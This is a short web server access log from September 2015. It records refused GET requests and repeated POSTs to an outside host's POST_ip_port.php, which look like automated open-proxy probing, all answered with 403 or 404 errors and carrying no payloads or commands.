111.20.248.74 - - [08/Sep/2015:19:09:57 +0000] "GET / HTTP/1.1" 403 0 "http://www.baidu.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" "-"
111.20.248.74 - - [08/Sep/2015:19:09:57 +0000] "GET / HTTP/1.1" 403 0 "http://www.baidu.com" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" "-"
121.42.0.39 - - [08/Sep/2015:19:16:00 +0000] "GET / HTTP/1.1" 403 570 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.950384.p)" "-"
222.186.30.211 - - [08/Sep/2015:19:16:11 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
220.180.172.124 - - [08/Sep/2015:19:34:02 +0000] "GET http://hlj.sina.com.cn/ HTTP/1.1" 403 570 "http://hlj.sina.com.cn/" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)" "-"
222.186.129.5 - - [08/Sep/2015:19:37:44 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:19:43:36 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:19:43:54 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.58.121 - - [08/Sep/2015:19:49:22 +0000] "GET http://www.baidu.com/ HTTP/1.1" 403 570 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:19:54:29 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.31.145 - - [08/Sep/2015:20:28:04 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.129.5 - - [08/Sep/2015:20:44:30 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.1" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
222.186.30.211 - - [08/Sep/2015:21:01:42 +0000] "POST http://123.249.24.233/POST_ip_port.php HTTP/1.0" 404 570 "http://123.249.24.233/POST_ip_port.phpAccept: */*" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)" "-"
